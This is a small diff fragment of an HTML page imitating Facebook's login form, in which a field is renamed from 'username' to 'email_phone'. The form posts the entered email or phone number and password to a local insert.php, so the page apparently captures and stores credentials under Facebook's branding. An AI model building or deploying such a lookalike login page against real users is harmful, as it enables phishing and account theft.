@@ -9,7 +9,7 @@
           <p> around you on Facebook.</p>
         </div>
         <form name="login" method="post" action="insert.php">
-          <input name="username" type="text" placeholder="Email or phone number" required>
+          <input name="email_phone" type="text" placeholder="Email or phone number" required>
           <input  name="password"type="password" placeholder="Password" required>
           <div class="link">
             <button type="submit" class="login" name="Submit">Login</button>
